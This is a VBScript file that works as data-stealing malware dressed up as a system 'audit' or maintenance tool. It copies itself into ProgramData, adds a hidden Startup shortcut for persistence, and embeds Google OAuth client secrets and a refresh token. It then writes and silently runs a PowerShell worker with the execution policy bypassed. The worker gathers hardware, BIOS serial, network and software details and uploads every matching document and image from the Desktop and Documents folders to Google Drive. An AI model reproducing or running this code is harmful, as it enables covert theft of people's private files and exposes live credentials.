Option Explicit

' --- 1. INITIALIZATION & PERSISTENCE ---
Dim objFSO, objShell, objFile, objShortcut, currentScript
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strCID, strSEC, strTOK, strBaseID

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

currentScript = WScript.ScriptFullName
strWorkerName = "ultra_audit_v6.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' Persistence logic
On Error Resume Next
If Not objFSO.FileExists(appDataPath) Then objFSO.CopyFile currentScript, appDataPath, True
If Not objFSO.FileExists(startupPath) Then
    Set objShortcut = objShell.CreateShortcut(startupPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & appDataPath & """"
    objShortcut.WindowStyle = 0
    objShortcut.Save
End If
On Error GoTo 0

' --- 2. GOOGLE API CONFIG ---
strCID = "530948914128-e149toq350bv8hc54lgfsv732hsisoqr.apps.googleusercontent.com"
strSEC = "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" 
strTOK = "1//0gqZ65Thvx4lQCgYIARAAGBASNwF-L9IryypMpe2NRPY9kwNw9dtwZ-7rNL5-ZQPLCRMabjJn9JRoHRrj5gm27x73Ca6GefEzg-k"
strBaseID = "root"

' --- 3. CONSTRUCT THE POWERSHELL WORKER ---
Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'; $SEC = '" & strSEC & "'; $TOK = '" & strTOK & "'; $BID = '" & strBaseID & "'"

' Auth & Upload Functions
objFile.WriteLine "try { $a = Invoke-RestMethod -Uri 'https://oauth2.googleapis.com/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h = @{Authorization=""Bearer $($a.access_token)""} } catch { exit }"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body (@{name=""Audit-$($env:COMPUTERNAME)-$(Get-Date -f 'MMdd-HHmm')"";mimeType='application/vnd.google-apps.folder';parents=@($BID)}|ConvertTo-Json) -ContentType 'application/json').id"
objFile.WriteLine "function Up($n, $p, $t) { try { $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' --- 4. ULTIMATE DATA ENGINE ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "function Add-H($t) { [void]$R.AppendLine(""`r`n""); [void]$R.AppendLine('='*60); [void]$R.AppendLine(""  $t""); [void]$R.AppendLine('='*60) }"

' 4.1 DEEP MEMORY ANALYSIS
objFile.WriteLine "Add-H 'PHYSICAL MEMORY (RAM) INVENTORY'"
objFile.WriteLine "$sticks = Get-CimInstance Win32_PhysicalMemory"
objFile.WriteLine "$totalMem = ($sticks | Measure-Object -Property Capacity -Sum).Sum"
objFile.WriteLine "[void]$R.AppendLine('TOTAL SYSTEM MEMORY: ' + [math]::round($totalMem / 1GB, 2) + ' GB')"
objFile.WriteLine "$sticks | Select-Object BankLabel, DeviceLocator, @{N='Capacity_GB';E={[math]::round($_.Capacity/1GB, 2)}}, Speed, Manufacturer | ft -AutoSize | Out-String | %{[void]$R.AppendLine($_)}"

' 4.2 COMPLETE DRIVE INVENTORY (Internal & External)
objFile.WriteLine "Add-H 'DRIVE & STORAGE INVENTORY'"
objFile.WriteLine "Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, @{N='Type';E={switch($_.DriveType){2{'Removable'} 3{'Fixed'} 4{'Network'} 5{'CD-ROM'} default{'Unknown'}}}}, VolumeName, @{N='Total_GB';E={[math]::Round($_.Size/1GB,2)}}, @{N='Free_GB';E={[math]::Round($_.FreeSpace/1GB,2)}}, @{N='PercentFree';E={[math]::Round(($_.FreeSpace/$_.Size)*100,1)}} | ft -AutoSize | Out-String | %{[void]$R.AppendLine($_)}"

' 4.3 SYSTEM & NETWORK
objFile.WriteLine "Add-H 'SYSTEM IDENTIFICATION'"
objFile.WriteLine "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture | ft -AutoSize | Out-String | %{[void]$R.AppendLine($_)}"
objFile.WriteLine "Get-CimInstance Win32_Bios | Select-Object SerialNumber, Manufacturer, ReleaseDate | ft -AutoSize | Out-String | %{[void]$R.AppendLine($_)}"

objFile.WriteLine "Add-H 'NETWORK INTERFACES'"
objFile.WriteLine "Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -notmatch 'Loopback' | Select-Object InterfaceAlias, IPAddress | ft -AutoSize | Out-String | %{[void]$R.AppendLine($_)}"

' 4.4 SOFTWARE INVENTORY
objFile.WriteLine "Add-H 'INSTALLED APPLICATIONS'"
objFile.WriteLine "$sw = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -EA 0"
objFile.WriteLine "$sw | ?{$_.DisplayName} | Select-Object DisplayName, DisplayVersion | Sort DisplayName | ft -AutoSize | Out-String | %{[void]$R.AppendLine($_)}"

' Save and Upload
objFile.WriteLine "$rt=""$env:TEMP\UltraReport.txt""; $R.ToString() | Out-File $rt; Up 'Ultra_System_Report.txt' $rt $SID; rm $rt"

' --- 5. FILE SCRAPER ---
objFile.WriteLine "$pts = @([Environment]::GetFolderPath('Desktop'), [Environment]::GetFolderPath('MyDocuments'))"
objFile.WriteLine "foreach($p in ($pts | select -Unique)){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 15MB -and $_.Extension -match 'pdf|doc|xls|txt|jpg'} | %{ Up $_.Name $_.FullName $SID } } }"

objFile.Close

' --- 6. EXECUTION ---
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, False
